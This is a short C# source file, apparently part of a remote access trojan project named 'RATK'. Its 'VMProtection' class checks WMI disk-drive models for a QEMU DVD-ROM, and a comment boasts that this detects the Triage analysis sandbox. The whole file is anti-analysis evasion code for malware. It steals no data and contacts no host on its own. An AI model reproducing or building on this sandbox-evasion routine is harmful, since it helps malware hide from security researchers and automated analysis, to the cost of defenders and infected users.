using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading.Tasks;

namespace RATK
{
    internal class VMProtection
    {
        public static bool QEMU_DVDROM_CHECK()
        {
            // incredibly detects triage xd
            var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");

            foreach (var disk in searcher.Get())
            {
                string model = disk["Model"]?.ToString();
                if (model != null && model.Contains("QEMU QEMU DVD-ROM"))
                {
                    return true;
                }
            }
            return false;
        }
    }
}
